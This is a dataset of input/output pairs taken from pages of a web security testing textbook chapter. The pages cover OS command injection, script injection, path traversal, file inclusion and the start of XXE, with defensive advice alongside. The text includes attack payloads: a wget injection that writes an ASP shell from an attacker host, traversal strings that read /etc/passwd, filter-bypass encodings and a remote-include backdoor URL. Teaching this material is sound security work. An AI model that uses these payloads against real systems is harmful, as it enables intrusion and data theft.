    "output": "Stuttard c10.indd V2 - 07/05/2011 Page 366\n366 Chapter 10 n Attacking Back-End Components\nHACK STEPS\n1. The < and > characters are used, respectively, to direct the contents of a\nfile to the command’s input and to direct the command’s output to a file.\nIf it is not possible to use the preceding techniques to inject an entirely\nseparate command, you may still be able to read and write arbitrary file\ncontents using the < and > characters.\n2. Many operating system commands that applications invoke accept a num-\nber of command-line parameters that control their behavior. Often, user-\nsupplied input is passed to the command as one of these parameters, and\nyou may be able to add further parameters simply by inserting a space\nfollowed by the relevant parameter. For example, a web-authoring appli-\ncation may contain a function in which the server retrieves a user-speci-\nfied URL and renders its contents in-browser for editing. If the application\nsimply calls out to the wget program, you may be able to write arbitrary\nfile contents to the server’s filesystem by appending the -O command-line\nparameter used by wget. For example:\nurl=http://wahh-attacker.com/%20-O%20c:\\inetpub\\wwwroot\\scripts\\\ncmdasp.asp\nTIP Many command injection attacks require you to inject spaces to sepa-\nrate command-line arguments. If you fi nd that spaces are being fi ltered by\nthe application, and the platform you are attacking is UNIX-based, you may\nbe able to use the $IFS environment variable instead, which contains the\nwhitespace fi eld separators.\nFinding Dynamic Execution Vulnerabilities\nDynamic execution vulnerabilities most commonly arise in languages such\nas PHP and Perl. But in principle, any type of application platform may pass\nuser-supplied input to a script-based interpreter, sometimes on a different\nback-end server.\ncc1100..iinndddd 336666 88//1199//22001111 1122::1100::4477 PPMM"
  },
  {
    "input": "Preventing OS Command Injection",
    "output": "Stuttard c10.indd V2 - 07/05/2011 Page 367\nChapter 10 n Attacking Back-End Components 367\nHACK STEPS\n1. Any item of user-supplied data may be passed to a dynamic execution\nfunction. Some of the items most commonly used in this way are the\nnames and values of cookie parameters and persistent data stored in user\nprofiles as the result of previous actions.\n2. Try submitting the following values in turn as each targeted parameter:\n;echo%20111111\necho%20111111\nresponse.write%20111111\n:response.write%20111111\n3. Review the application’s responses. If the string 111111 is returned on its\nown (is not preceded by the rest of the command string), the application\nis likely to be vulnerable to the injection of scripting commands.\n4. If the string 111111 is not returned, look for any error messages that indi-\ncate that your input is being dynamically executed and that you may need\nto fine-tune your syntax to achieve injection of arbitrary commands.\n5. If the application you are attacking uses PHP, you can use the test string\nphpinfo(), which, if successful, returns the configuration details of the\nPHP environment.\n6. If the application appears to be vulnerable, verify this by injecting some\ncommands that result in time delays, as described previously for OS com-\nmand injection. For example:\nsystem(‘ping%20127.0.0.1’)\nPreventing OS Command Injection\nIn general, the best way to prevent OS command injection fl aws from arising\nis to avoid calling out directly to operating system commands. Virtually any\nconceivable task that a web application may need to carry out can be achieved\nusing built-in APIs that cannot be manipulated to perform commands other\nthan the one intended.\nIf it is considered unavoidable to embed user-supplied data into command\nstrings that are passed to an operating system command interpreter, the appli-\ncation should enforce rigorous defenses to prevent a vulnerability from arising.\nIf possible, a whitelist should be used to restrict user input to a specifi c set of\nexpected values. Alternatively, the input should be restricted to a very narrow\ncharacter set, such as alphanumeric characters only. Input containing any other\ndata, including any conceivable metacharacter or whitespace, should be rejected.\ncc1100..iinndddd 336677 88//1199//22001111 1122::1100::4477 PPMM"
  },
  {
    "input": "Path Traversal Vulnerabilities",
    "output": "Stuttard c10.indd V2 - 07/05/2011 Page 368\n368 Chapter 10 n Attacking Back-End Components\nAs a further layer of protection, the application should use command APIs\nthat launch a specifi c process via its name and command-line parameters,\nrather than passing a command string to a shell interpreter that supports\ncommand chaining and redirection. For example, the Java API Runtime.exec\nand the ASP.NET API Process.Start do not support shell metacharacters.\nIf used properly, they can ensure that only the command intended by the\ndeveloper will be executed. See Chapter 19 for more details of command\nexecution APIs.\nPreventing Script Injection Vulnerabilities\nIn general, the best way to avoid script injection vulnerabilities is to not pass\nuser-supplied input, or data derived from it, into any dynamic execution or\ninclude functions. If this is considered unavoidable for some reason, the rel-\nevant input should be strictly validated to prevent any attack from occurring.\nIf possible, use a whitelist of known good values that the application expects,\nand reject any input that does not appear on this list. Failing that, check the\ncharacters used within the input against a set known to be harmless, such as\nalphanumeric characters excluding whitespace.\nManipulating File Paths\nMany types of functionality commonly found in web applications involve pro-\ncessing user-supplied input as a fi le or directory name. Typically, the input is\npassed to an API that accepts a fi le path, such as in the retrieval of a fi le from the\nlocal fi lesystem. The application processes the result of the API call within its\nresponse to the user’s request. If the user-supplied input is improperly validated,\nthis behavior can lead to various security vulnerabilities, the most common of\nwhich are fi le path traversal bugs and fi le inclusion bugs.\nPath Traversal Vulnerabilities\nPath traversal vulnerabilities arise when the application uses user-controllable\ndata to access fi les and directories on the application server or another back-\nend fi lesystem in an unsafe way. By submitting crafted input, an attacker may\nbe able to cause arbitrary content to be read from, or written to, anywhere on\nthe fi lesystem being accessed. This often enables an attacker to read sensitive\ninformation from the server, or overwrite sensitive fi les, ultimately leading to\narbitrary command execution on the server.\ncc1100..iinndddd 336688 88//1199//22001111 1122::1100::4477 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 369\nChapter 10 n Attacking Back-End Components 369\nConsider the following example, in which an application uses a dynamic\npage to return static images to the client. The name of the requested image is\nspecifi ed in a query string parameter:\nhttp://mdsec.net/filestore/8/GetFile.ashx?filename=keira.jpg\nWhen the server processes this request, it follows these steps:\n1. Extracts the value of the filename parameter from the query string.\n2. Appends this value to the prefi x C:\\filestore\\.\n3. Opens the fi le with this name.\n4. Reads the fi le’s contents and returns it to the client.\nThe vulnerability arises because an attacker can place path traversal sequences\ninto the fi lename to backtrack up from the directory specifi ed in step 2 and\ntherefore access fi les from anywhere on the server that the user context used by\nthe application has privileges to access. The path traversal sequence is known\nas “dot-dot-slash”; a typical attack looks like this:\nhttp://mdsec.net/filestore/8/GetFile.ashx?filename=..\\windows\\win.ini\nWhen the application appends the value of the filename parameter to the\nname of the images directory, it obtains the following path:\nC:\\filestore\\..\\windows\\win.ini\nThe two traversal sequences effectively step back up from the images direc-\ntory to the root of the C: drive, so the preceding path is equivalent to this:\nC:\\windows\\win.ini\nHence, instead of returning an image fi le, the server actually returns a default\nWindows confi guration fi le.\nNOTE In older versions of Windows IIS web server, applications would, by\ndefault, run with local system privileges, allowing access to any readable fi le\non the local fi lesystem. In more recent versions, in common with many other\nweb servers, the server’s process by default runs in a less privileged user\ncontext. For this reason, when probing for path traversal vulnerabilities, it is\nbest to request a default fi le that can be read by any type of user, such as\nc:\\windows\\win.ini.\nIn this simple example, the application implements no defenses to prevent\npath traversal attacks. However, because these attacks have been widely known\ncc1100..iinndddd 336699 88//1199//22001111 1122::1100::4477 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 370\n370 Chapter 10 n Attacking Back-End Components\nabout for some time, it is common to encounter applications that implement\nvarious defenses against them, often based on input validation fi lters. As\nyou will see, these fi lters are often poorly designed and can be bypassed by a\nskilled attacker.\nTRY IT!\nhttp://mdsec.net/filestore/8/\nFinding and Exploiting Path Traversal Vulnerabilities\nMany kinds of functionality require a web application to read from or write to\na fi lesystem on the basis of parameters supplied within user requests. If these\noperations are carried out in an unsafe manner, an attacker can submit crafted\ninput that causes the application to access fi les that the application designer\ndid not intend it to access. Known as pathtraversal vulnerabilities, such defects\nmay enable the attacker to read sensitive data including passwords and appli-\ncation logs, or to overwrite security-critical items such as confi guration fi les\nand software binaries. In the most serious cases, the vulnerability may enable\nan attacker to completely compromise both the application and the underlying\noperating system.\nPath traversal fl aws are sometimes subtle to detect, and many web applications\nimplement defenses against them that may be vulnerable to bypasses. We will\ndescribe all the various techniques you will need, from identifying potential\ntargets, to probing for vulnerable behavior, to circumventing the application’s\ndefenses, to dealing with custom encoding.\nLocating Targets for Attack\nDuring your initial mapping of the application, you should already have identifi ed\nany obvious areas of attack surface in relation to path traversal vulnerabilities.\nAny functionality whose explicit purpose is uploading or downloading fi les\nshould be thoroughly tested. This functionality is often found in work fl ow\napplications where users can share documents, in blogging and auction appli-\ncations where users can upload images, and in informational applications\nwhere users can retrieve documents such as ebooks, technical manuals, and\ncompany reports.\nIn addition to obvious target functionality of this kind, various other types\nof behavior may suggest relevant interaction with the fi lesystem.\ncc1100..iinndddd 337700 88//1199//22001111 1122::1100::4477 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 371\nChapter 10 n Attacking Back-End Components 371\nHACK STEPS\n1. Review the information gathered during application mapping to identify\nthe following:\nn Any instance where a request parameter appears to contain the name\nof a fi le or directory, such as include=main.inc or template=/en/\nsidebar.\nn Any application functions whose implementation is likely to involve\nretrieval of data from a server fi lesystem (as opposed to a back-end\ndatabase), such as the displaying of offi ce documents or images.\n2. During all testing you perform in relation to every other kind of vulner-\nability, look for error messages or other anomalous events that are\nof interest. Try to find any evidence of instances where user-supplied\ndata is being passed to file APIs or as parameters to operating system\ncommands.\nTIP If you have local access to the application (either in a whitebox testing exer-\ncise or because you have compromised the server’s operating system), identify-\ning targets for path traversal testing is usually straightforward, because you can\nmonitor all fi lesystem interaction that the application performs.\nHACK STEPS\nIf you have local access to the web application, do the following:\n1. Use a suitable tool to monitor all filesystem activity on the server. For\nexample, the FileMon tool from SysInternals can be used on the Windows\nplatform, the ltrace/strace tools can be used on Linux, and the truss\ncommand can be used on Sun’s Solaris.\n2. Test every page of the application by inserting a single unique string (such\nastraversaltest) into each submitted parameter (including all cookies,\nquery string fields, and POST data items). Target only one parameter at a\ntime, and use the automated techniques described in Chapter 14 to speed\nup the process.\n3. Set a filter in your filesystem monitoring tool to identify all filesystem\nevents that contain your test string.\n4. If any events are identified where your test string has been used as or\nincorporated into a file or directory name, test each instance (as described\nnext) to determine whether it is vulnerable to path traversal attacks.\ncc1100..iinndddd 337711 88//1199//22001111 1122::1100::4477 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 372\n372 Chapter 10 n Attacking Back-End Components\nDetecting Path Traversal Vulnerabilities\nHaving identifi ed the various potential targets for path traversal testing, you\nneed to test every instance individually to determine whether user-controllable\ndata is being passed to relevant fi lesystem operations in an unsafe manner.\nFor each user-supplied parameter being tested, determine whether traversal\nsequences are being blocked by the application or whether they work as expected.\nAn initial test that is usually reliable is to submit traversal sequences in a way\nthat does not involve stepping back above the starting directory.\nHACK STEPS\n1. Working on the assumption that the parameter you are targeting is being\nappended to a preset directory specified by the application, modify the\nparameter’s value to insert an arbitrary subdirectory and a single traversal\nsequence. For example, if the application submits this parameter:\nfile=foo/file1.txt\ntry submitting this value:\nfile=foo/bar/../file1.txt\nIf the application’s behavior is identical in the two cases, it may be vul-\nnerable. You should proceed directly to attempting to access a different\nfile by traversing above the start directory.\n2. If the application’s behavior is different in the two cases, it may be block-\ning, stripping, or sanitizing traversal sequences, resulting in an invalid file\npath. You should examine whether there are any ways to circumvent the\napplication’s validation filters (described in the next section).\nThe reason why this test is effective, even if the subdirectory “bar” does\nnot exist, is that most common filesystems perform canonicalization of\nthe file path before attempting to retrieve it. The traversal sequence can-\ncels out the invented directory, so the server does not check whether it is\npresent.\nIf you fi nd any instances where submitting traversal sequences without step-\nping above the starting directory does not affect the application’s behavior, the\nnext test is to attempt to traverse out of the starting directory and access fi les\nfrom elsewhere on the server fi lesystem.\ncc1100..iinndddd 337722 88//1199//22001111 1122::1100::4477 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 373\nChapter 10 n Attacking Back-End Components 373\nHACK STEPS\n1. If the application function you are attacking provides read access to a file,\nattempt to access a known world-readable file on the operating system in\nquestion. Submit one of the following values as the filename parameter\nyou control:\n../../../../../../../../../../../../etc/passwd\n../../../../../../../../../../../../windows/win.ini\nIf you are lucky, your browser displays the contents of the file you have\nrequested, as shown in Figure 10-5.\n2. If the function you are attacking provides write access to a file, it may be\nmore difficult to verify conclusively whether the application is vulnera-\nble. One test that is often effective is to attempt to write two files — one\nthat should be writable by any user, and one that should not be writable\neven by root or Administrator. For example, on Windows platforms you\ncan try this:\n../../../../../../../../../../../../writetest.txt\n../../../../../../../../../../../../windows/system32/config/sam\nOn UNIX-based platforms, files that root may not write are version-\ndependent, but attempting to overwrite a directory with a file should\nalways fail, so you can try this:\n../../../../../../../../../../../../tmp/writetest.txt\n../../../../../../../../../../../../tmp\nFor each pair of tests, if the application’s behavior is different in\nresponse to the first and second requests (for example, if the second\nreturns an error message but the first does not), the application probably\nis vulnerable.\n3. An alternative method for verifying a traversal flaw with write access is\nto try to write a new file within the web root of the web server and then\nattempt to retrieve this with a browser. However, this method may not\nwork if you do not know the location of the web root directory or if the\nuser context in which the file access occurs does not have permission to\nwrite there.\ncc1100..iinndddd 337733 88//1199//22001111 1122::1100::4477 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 374\n374 Chapter 10 n Attacking Back-End Components\nFigure 10-5: A successful path traversal attack\nNOTE Virtually all fi lesystems tolerate redundant traversal sequences that\nappear to try to move above the root of the fi lesystem. Hence, it is usually\nadvisable to submit a large number of traversal sequences when probing for\na fl aw, as in the examples given here. It is possible that the starting directory\nto which your data is appended lies deep within the fi lesystem, so using an\nexcessive number of sequences helps avoid false negatives.\nAlso, the Windows platform tolerates both forward slashes and backslashes\nas directory separators, whereas UNIX-based platforms tolerate only the for-\nward slash. Furthermore, some web applications fi lter one version but not\nthe other. Even if you are certain that the web server is running a UNIX-based\noperating system, the application may still be calling out to a Windows-based\nback-end component. Because of this, it is always advisable to try both ver-\nsions when probing for traversal fl aws.\nCircumventing Obstacles to Traversal Attacks\nIf your initial attempts to perform a traversal attack (as just described) are\nunsuccessful, this does not mean that the application is not vulnerable. Many\napplication developers are aware of path traversal vulnerabilities and implement\nvarious kinds of input validation checks in an attempt to prevent them. However,\nthose defenses are often fl awed and can be bypassed by a skilled attacker.\nThe fi rst type of input fi lter commonly encountered involves checking whether\nthe fi lename parameter contains any path traversal sequences. If it does, the\nfi lter either rejects the request or attempts to sanitize the input to remove the\nsequences. This type of fi lter is often vulnerable to various attacks that use alter-\nnative encodings and other tricks to defeat the fi lter. These attacks all exploit\nthe type of canonicalization problems faced by input validation mechanisms,\nas described in Chapter 2.\ncc1100..iinndddd 337744 88//1199//22001111 1122::1100::4477 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 375\nChapter 10 n Attacking Back-End Components 375\nHACK STEPS\n1. Always try path traversal sequences using both forward slashes and back-\nslashes. Many input filters check for only one of these, when the filesys-\ntem may support both.\n2. Try simple URL-encoded representations of traversal sequences using the\nfollowing encodings. Be sure to encode every single slash and dot within\nyour input:\nn Dot — %2e\nn Forward slash — %2f\nn Backslash — %5c\n3. Try using 16-bit Unicode encoding:\nn Dot — %u002e\nn Forward slash — %u2215\nn Backslash — %u2216\n4. Try double URL encoding:\nn Dot — %252e\nn Forward slash — %252f\nn Backslash — %255c\n5. Try overlong UTF-8 Unicode encoding:\nn Dot — %c0%2e,%e0%40%ae,%c0ae, and so on\nn Forward slash — %c0%af,%e0%80%af,%c0%2f, and so on\nn Backslash — %c0%5c,%c0%80%5c, and so on\nYou can use the illegal Unicode payload type within Burp Intruder to\ngenerate a huge number of alternate representations of any given char-\nacter and submit this at the relevant place within your target parameter.\nThese representations strictly violate the rules for Unicode representa-\ntion but nevertheless are accepted by many implementations of Unicode\ndecoders, particularly on the Windows platform.\n6. If the application is attempting to sanitize user input by removing tra-\nversal sequences and does not apply this filter recursively, it may be\npossible to bypass the filter by placing one sequence within another. For\nexample:\n....//\n....\\/\n..../\\\n....\\\\\ncc1100..iinndddd 337755 88//1199//22001111 1122::1100::4488 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 376\n376 Chapter 10 n Attacking Back-End Components\nTRY IT!\nhttp://mdsec.net/filestore/30/\nhttp://mdsec.net/filestore/39/\nhttp://mdsec.net/filestore/46/\nhttp://mdsec.net/filestore/59/\nhttp://mdsec.net/filestore/65/\nThe second type of input fi lter commonly encountered in defenses against path\ntraversal attacks involves verifying whether the user-supplied fi lename contains\na suffi x (fi le type) or prefi x (starting directory) that the application expects. This\ntype of defense may be used in tandem with the fi lters already described.\nHACK STEPS\n1. Some applications check whether the user-supplied filename ends in\na particular file type or set of file types and reject attempts to access\nanything else. Sometimes this check can be subverted by placing a URL-\nencoded null byte at the end of your requested filename, followed by a\nfile type that the application accepts. For example:\n../../../../../boot.ini%00.jpg\nThe reason this attack sometimes succeeds is that the file type check\nis implemented using an API in a managed execution environment in\nwhich strings are permitted to contain null characters (such as String.\nendsWith() in Java). However, when the file is actually retrieved, the\napplication ultimately uses an API in an unmanaged environment in which\nstrings are null-terminated. Therefore, your filename is effectively trun-\ncated to your desired value.\n2. Some applications attempt to control the file type being accessed by\nappending their own file-type suffix to the filename supplied by the user.\nIn this situation, either of the preceding exploits may be effective, for the\nsame reasons.\n3. Some applications check whether the user-supplied filename starts with\na particular subdirectory of the start directory, or even a specific filename.\nThis check can, of course, be bypassed easily as follows:\nfilestore/../../../../../../../etc/passwd\n4. If none of the preceding attacks against input filters is successful indi-\nvidually, the application might be implementing multiple types of filters.\nTherefore, you need to combine several of these attacks simultaneously\n(both against traversal sequence filters and file type or directory filters). If\ncc1100..iinndddd 337766 88//1199//22001111 1122::1100::4488 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 377\nChapter 10 n Attacking Back-End Components 377\nHACK STEPS\npossible, the best approach here is to try to break the problem into sepa-\nrate stages. For example, if the request for:\ndiagram1.jpg\nis successful, but the request for:\nfoo/../diagram1.jpg\nfails, try all the possible traversal sequence bypasses until a variation on\nthe second request is successful. If these successful traversal sequence\nbypasses don’t enable you to access /etc/passwd, probe whether any\nfile type filtering is implemented and can be bypassed by requesting:\ndiagram1.jpg%00.jpg\nWorking entirely within the start directory defined by the application,\ntry to probe to understand all the filters being implemented, and see\nwhether each can be bypassed individually with the techniques described.\n5. Of course, if you have whitebox access to the application, your task is\nmuch easier, because you can systematically work through different types\nof input and verify conclusively what filename (if any) is actually reaching\nthe filesystem.\nCoping with Custom Encoding\nProbably the craziest path traversal bug that the authors have encountered\ninvolved a custom encoding scheme for fi lenames that were ultimately handled\nin an unsafe way. It demonstrated how obfuscation is no substitute for security.\nThe application contained some work fl ow functionality that enabled users\nto upload and download fi les. The request performing the upload supplied a\nfi lename parameter that was vulnerable to a path traversal attack when writing\nthe fi le. When a fi le had been successfully uploaded, the application provided\nusers with a URL to download it again. There were two important caveats:\nn The application verifi ed whether the fi le to be written already existed. If\nit did, the application refused to overwrite it.\nn The URLs generated for downloading users’ fi les were represented using\na proprietary obfuscation scheme. This appeared to be a customized form\nof Base64 encoding in which a different character set was employed at\neach position of the encoded fi lename.\nTaken together, these caveats presented a barrier to straightforward exploita-\ntion of the vulnerability. First, although it was possible to write arbitrary fi les to\ncc1100..iinndddd 337777 88//1199//22001111 1122::1100::4488 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 378\n378 Chapter 10 n Attacking Back-End Components\nthe server fi lesystem, it was not possible to overwrite any existing fi le. Also, the\nlow privileges of the web server process meant that it was not possible to create\na new fi le in any interesting locations. Second, it was not possible to request\nan arbitrary existing fi le (such as /etc/passwd) without reverse engineering\nthe custom encoding, which presented a lengthy and unappealing challenge.\nA little experimentation revealed that the obfuscated URLs contained the\noriginal fi lename string supplied by the user. For example:\nn test.txt became zM1YTU4NTY2Y\nn foo/../test.txt became E1NzUyMzE0ZjQ0NjMzND\nThe difference in length of the encoded URLs indicated that no path canoni-\ncalization was performed before the encoding was applied. This behavior gave\nus enough of a toehold to exploit the vulnerability. The fi rst step was to submit\na fi le with the following name:\n../../../../../.././etc/passwd/../../tmp/foo\nwhich, in its canonical form, is equivalent to:\n/tmp/foo\nTherefore, it could be written by the web server. Uploading this fi le produced\na download URL containing the following obfuscated fi lename:\nFhwUk1rNXFUVEJOZW1kNlRsUk5NazE2V1RKTmFrMHdUbXBWZWs1NldYaE5lb\nTo modify this value to return the fi le /etc/passwd, we simply needed to\ntruncate it at the right point, which was:\nFhwUk1rNXFUVEJOZW1kNlRsUk5NazE2V1RKTmFrM\nAttempting to download a fi le using this value returned the server’s passwd\nfi le as expected. The server had given us suffi cient resources to be able to encode\narbitrary fi le paths using its scheme, without even deciphering the obfuscation\nalgorithm being used!\nNOTE You may have noticed the appearance of a redundant ./ in the name\nof our uploaded fi le. This was necessary to ensure that our truncated URL\nended on a 3-byte boundary of cleartext, and therefore on a 4-byte bound-\nary of encoded text, in line with the Base64 encoding scheme. Truncating an\nencoded URL partway through an encoded block would almost certainly cause\nan error when decoded on the server.\ncc1100..iinndddd 337788 88//1199//22001111 1122::1100::4488 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 379\nChapter 10 n Attacking Back-End Components 379\nExploiting Traversal Vulnerabilities\nHaving identifi ed a path traversal vulnerability that provides read or write\naccess to arbitrary fi les on the server’s fi lesystem, what kind of attacks can you\ncarry out by exploiting these? In most cases, you will fi nd that you have the\nsame level of read/write access to the fi lesystem as the web server process does.\nHACK STEPS\nYou can exploit read access path traversal fl aws to retrieve interesting fi les\nfrom the server that may contain directly useful information or that help you\nrefi ne attacks against other vulnerabilities. For example:\nn Password fi les for the operating system and application\nn Server and application confi guration fi les to discover other vulnerabilities\nor fi ne-tune a different attack\nn Include fi les that may contain database credentials\nn Data sources used by the application, such as MySQL database fi les or\nXML fi les\nn The source code to server-executable pages to perform a code review in\nsearch of bugs (for example, GetImage.aspx?file=GetImage.aspx)\nn Application log fi les that may contain usernames and session tokens and\nthe like\nIf you fi nd a path traversal vulnerability that grants write access, your main\ngoal should be to exploit this to achieve arbitrary execution of commands on\nthe server. Here are some ways to exploit this vulnerability:\nn Create scripts in users’ startup folders.\nn Modify fi les such as in.ftpd to execute arbitrary commands when a\nuser next connects.\nn Write scripts to a web directory with execute permissions, and call them\nfrom your browser.\nPreventing Path Traversal Vulnerabilities\nBy far the most effective means of eliminating path traversal vulnerabilities is to\navoid passing user-submitted data to any fi lesystem API. In many cases, includ-\ning the original example GetFile.ashx?filename=keira.jpg, it is unnecessary\nfor an application to do this. Most fi les that are not subject to any access control\ncan simply be placed within the web root and accessed via a direct URL. If this\ncc1100..iinndddd 337799 88//1199//22001111 1122::1100::4488 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 380\n380 Chapter 10 n Attacking Back-End Components\nis not possible, the application can maintain a hard-coded list of image fi les that\nmay be served by the page. It can use a different identifi er to specify which\nfi le is required, such as an index number. Any request containing an invalid\nidentifi er can be rejected, and there is no attack surface for users to manipulate\nthe path of fi les delivered by the page.\nIn some cases, as with the work fl ow functionality that allows fi le uploading\nand downloading, it may be desirable to allow users to specify fi les by name.\nDevelopers may decide that the easiest way to implement this is by passing\nthe user-supplied fi lename to fi lesystem APIs. In this situation, the application\nshould take a defense-in-depth approach to place several obstacles in the way\nof a path traversal attack.\nHere are some examples of defenses that may be used; ideally, as many of\nthese as possible should be implemented together:\nn After performing all relevant decoding and canonicalization of the user-\nsubmitted fi lename, the application should check whether it contains either\nof the path traversal sequences (using backslashes or forward slashes) or\nany null bytes. If so, the application should stop processing the request. It\nshould not attempt to perform any sanitization on the malicious fi lename.\nn The application should use a hard-coded list of permissible fi le types and\nreject any request for a different type (after the preceding decoding and\ncanonicalization have been performed).\nn After performing all its fi ltering on the user-supplied fi lename, the appli-\ncation should use suitable fi lesystem APIs to verify that nothing is amiss\nand that the fi le to be accessed using that fi lename is located in the start\ndirectory specifi ed by the application.\nIn Java, this can be achieved by instantiating a java.io.File object using\nthe user-supplied fi lename and then calling the getCanonicalPath method\non this object. If the string returned by this method does not begin with the\nname of the start directory, the user has somehow bypassed the applica-\ntion’s input fi lters, and the request should be rejected.\nIn ASP.NET, this can be achieved by passing the user-supplied fi lename\nto the System.Io.Path.GetFullPath method and checking the returned\nstring in the same way as described for Java.\nThe application can mitigate the impact of most exploitable path traversal\nvulnerabilities by using a chrooted environment to access the directory contain-\ning the fi les to be accessed. In this situation, the chrooted directory is treated as\ncc1100..iinndddd 338800 88//1199//22001111 1122::1100::4488 PPMM"
  },
  {
    "input": "File Inclusion Vulnerabilities",
    "output": "Stuttard c10.indd V2 - 07/05/2011 Page 381\nChapter 10 n Attacking Back-End Components 381\nif it is the fi lesystem root, and any redundant traversal sequences that attempt\nto step up above it are ignored. Chrooted fi lesystems are supported natively\non most UNIX-based platforms. A similar effect can be achieved on Windows\nplatforms (in relation to traversal vulnerabilities, at least) by mounting the\nrelevant start directory as a new logical drive and using the associated drive\nletter to access its contents.\nThe application should integrate its defenses against path traversal attacks\nwith its logging and alerting mechanisms. Whenever a request is received that\ncontains path traversal sequences, this indicates likely malicious intent on the\nuser’s part. The application should log the request as an attempted security\nbreach, terminate the user’s session, and, if applicable, suspend the user’s account\nand generate an alert to an administrator.\nFile Inclusion Vulnerabilities\nMany scripting languages support the use of include fi les. This facility enables\ndevelopers to place reusable code components into separate fi les and to include\nthese within function-specifi c code fi les as and when they are needed. The code\nwithin the included fi le is interpreted just as if it had been inserted at the loca-\ntion of the include directive.\nRemote File Inclusion\nThe PHP language is particularly susceptible to fi le inclusion vulnerabilities\nbecause its include functions can accept a remote fi le path. This has been the\nbasis of numerous vulnerabilities in PHP applications.\nConsider an application that delivers different content to people in different\nlocations. When users choose their location, this is communicated to the server\nvia a request parameter, as follows:\nhttps://wahh-app.com/main.php?Country=US\nThe application processes the Country parameter as follows:\n$country = $_GET[‘Country’];\ninclude( $country . ‘.php’ );\nThis causes the execution environment to load the fi le US.php that is located\non the web server fi lesystem. The contents of this fi le are effectively copied into\nthe main.php fi le and executed.\ncc1100..iinndddd 338811 88//1199//22001111 1122::1100::4488 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 382\n382 Chapter 10 n Attacking Back-End Components\nAn attacker can exploit this behavior in different ways, the most serious of\nwhich is to specify an external URL as the location of the include fi le. The PHP\ninclude function accepts this as input, and the execution environment retrieves\nthe specifi ed fi le and executes its contents. Hence, an attacker can construct\na malicious script containing arbitrarily complex content, host this on a web\nserver he controls, and invoke it for execution via the vulnerable application\nfunction. For example:\nhttps://wahh-app.com/main.php?Country=http://wahh-attacker.com/backdoor\nLocal File Inclusion\nIn some cases, include fi les are loaded on the basis of user-controllable data, but\nit is not possible to specify a URL to a fi le on an external server. For example,\nif user-controllable data is passed to the ASP function Server.Execute, an\nattacker may be able to cause an arbitrary ASP script to be executed, provided\nthat this script belongs to the same application as the one that is calling the\nfunction.\nIn this situation, you may still be able to exploit the application’s behavior to\nperform unauthorized actions:\nn There may be server-executable fi les on the server that you cannot access\nthrough the normal route. For example, any requests to the path /admin\nmay be blocked through application-wide access controls. If you can cause\nsensitive functionality to be included into a page that you are authorized\nto access, you may be able to gain access to that functionality.\nn There may be static resources on the server that are similarly protected\nfrom direct access. If you can cause these to be dynamically included\ninto other application pages, the execution environment typically simply\ncopies the contents of the static resource into its response.\nFinding File Inclusion Vulnerabilities\nFile inclusion vulnerabilities may arise in relation to any item of user-supplied\ndata. They are particularly common in request parameters that specify a lan-\nguage or location. They also often arise when the name of a server-side fi le is\npassed explicitly as a parameter.\ncc1100..iinndddd 338822 88//1199//22001111 1122::1100::4488 PPMM"
  },
  {
    "input": "Injecting into XML Interpreters",
    "output": "Stuttard c10.indd V2 - 07/05/2011 Page 383\nChapter 10 n Attacking Back-End Components 383\nHACK STEPS\nTo test for remote fi le inclusion fl aws, follow these steps:\n1. Submit in each targeted parameter a URL for a resource on a web server\nthat you control, and determine whether any requests are received from\nthe server hosting the target application.\n2. If the first test fails, try submitting a URL containing a nonexistent IP\naddress, and determine whether a timeout occurs while the server\nattempts to connect.\n3. If the application is found to be vulnerable to remote file inclusion, con-\nstruct a malicious script using the available APIs in the relevant language,\nas described for dynamic execution attacks.\nLocal fi le inclusion vulnerabilities can potentially exist in a much wider\nrange of scripting environments than those that support remote fi le inclu-\nsion. To test for local fi le inclusion vulnerabilities, follow these steps:\n1. Submit the name of a known executable resource on the server, and\ndetermine whether any change occurs in the application’s behavior.\n2. Submit the name of a known static resource on the server, and determine\nwhether its contents are copied into the application’s response.\n3. If the application is vulnerable to local file inclusion, attempt to access\nany sensitive functionality or resources that you cannot reach directly via\nthe web server.\n4. Test to see if you can access files in other directories using the traversal\ntechniques described previously.\nInjecting into XML Interpreters\nXML is used extensively in today’s web applications, both in requests and\nresponses between the browser and front-end application server and in mes-\nsages between back-end application components such as SOAP services. Both\nof these locations are susceptible to attacks whereby crafted input is used to\ninterfere with the operation of the application and normally perform some\nunauthorized action.\ncc1100..iinndddd 338833 88//1199//22001111 1122::1100::4488 PPMM"
  },
  {
    "input": "Injecting XML External Entities",
    "output": "Stuttard c10.indd V2 - 07/05/2011 Page 384\n384 Chapter 10 n Attacking Back-End Components\nInjecting XML External Entities\nIn today’s web applications, XML is often used to submit data from the client\nto the server. The server-side application then acts on this data and may return\na response containing XML or data in any other format. This behavior is most\ncommonly found in Ajax-based applications where asynchronous requests are\nused to communicate in the background. It can also appear in the context of\nbrowser extension components and other client-side technologies.\nFor example, consider a search function that, to provide a seamless user\nexperience, is implemented using Ajax. When a user enters a search term, a\nclient-side script issues the following request to the server:\nPOST /search/128/AjaxSearch.ashx HTTP/1.1\nHost: mdsec.net\nContent-Type: text/xml; charset=UTF-8\nContent-Length: 44\n<Search><SearchTerm>nothing will change</SearchTerm></Search>\nThe server’s response is as follows (although vulnerabilities may exist regard-\nless of the format used in responses):\nHTTP/1.1 200 OK\nContent-Type: text/xml; charset=utf-8\nContent-Length: 81\n<Search><SearchResult>No results found for expression: nothing will\nchange</SearchResult></Search>\nThe client-side script processes this response and updates part of the user\ninterface with the results of the search.\nWhen you encounter this type of functionality, you should always check for\nXML external entity (XXE) injection. This vulnerability arises because standard\nXML parsing libraries support the use of entity references. These are simply a\nmethod of referencing data either inside or outside the XML document. Entity\nreferences should be familiar from other contexts. For example, the entities\ncorresponding to the < and > characters are as follows:\n&lt;\n&gt;\nThe XML format allows custom entities to be defi ned within the XML docu-\nment itself. This is done within the optional DOCTYPE element at the start of the\ndocument. For example:\n<!DOCTYPE foo [ 